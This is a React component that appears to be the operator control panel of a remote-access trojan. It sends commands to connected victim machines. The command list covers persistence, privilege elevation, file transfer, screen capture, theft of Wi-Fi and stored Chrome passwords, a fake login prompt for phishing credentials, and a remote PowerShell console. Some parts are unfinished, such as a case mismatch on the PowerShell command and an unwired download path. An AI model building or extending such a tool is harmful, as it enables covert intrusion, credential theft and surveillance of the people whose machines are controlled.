import {Button, Form} from "react-bootstrap";
import React, { useState} from "react";
import {sendCommand, uploadFile} from "../../api/api";

function ClientActions(props) {
    const [fileName, setFileName] = useState(null);
    const [file, setFile] = useState(null)
    const [command, setCommand] = useState("stayhome");
    const [errors, setErrors] = useState(null);

    async function SendCommand()
    {
        setErrors(null);

        //need a global state of the client is connected? and only then allow sending the command
        if(props.client.status)
        {
            if(command === 'startPS') {
                //disable all other buttons and command select
            }
            else{
                let response = await sendCommand(props.client.client_id, command);
                if(!response) {
                    setErrors("Unable to send command to server, please try again");
                }
            }
        }
    }

    async function UploadFile()
    {
        if(fileName !== null){
            setErrors(null);
            if(props.client.status)
            {
                const formData = new FormData();
                formData.append("name",fileName);
                formData.append("file", file)
                let response = await uploadFile(formData);
                if(!response) {
                    setErrors("Unable to upload file, please try again");
                }
            }
        }
        else
            setErrors("No file was chosen");
    }

    function DisplayCorrectButton()
    {
        if(command === "upload" || command === "change-image"){
            return (
                <>
                    <Form.File className={"small-titles"} id="upload-file" label="Choose file" onChange={(e) => {
                        setFileName(e.target.files[0].name);
                        setFile(e.target.files[0]);
                    }}/>
                    <Button className="buttons" id={"send-button"} disabled={!props.client.status} variant={"success"} onClick={UploadFile}>Upload</Button>
                </>
            )
        }
        else if(command === "download"){
            return(
                <>
                    <Form.Label>Remote path:</Form.Label>
                    <Form.Control type="text" placeholder="Enter path" />
                </>
            )
        }
        else{
            return (
                <>
                    <Button className="buttons" id={"send-button"} disabled={!props.client.status} variant={"success"} onClick={SendCommand}>Send</Button>
                </>
            )
        }
    }

    return (
        <>
            <Form.Group controlId="command">
                <Form.Label className={"small-titles"} id={"title2"}>Command</Form.Label>
                <Form.Control as="select" value={command} onChange={e => {
                    setCommand(e.target.value);
                }}>
                    <option value={"stayhome"}>Persistence</option>
                    <option value={"elevate"}>Elevate</option>
                    <option value={"upload"}>Upload</option>
                    <option value={"download"}>Download</option>
                    <option value={"change-image"}>Change background</option>
                    <option value={"capture"}>Screen capture</option>
                    <option value={"get-network"}>Get network information</option>
                    <option value={"getwifi"}>Get wifi passwords</option>
                    <option value={"webPass"}>Get stored chrome passwords</option>
                    <option value={"PromptUser"}>Prompt user for login UI</option>
                    <option value={"StartPS"}>Start powershell console</option>

                </Form.Control>
            </Form.Group>
            <Form.Group controlId="sendCommand">
                {DisplayCorrectButton()}
            </Form.Group>
            {errors && (<Form.Label id={"send-errors"} className={"buttons"}>{errors}</Form.Label>)}
        </>
    )
}

export default ClientActions;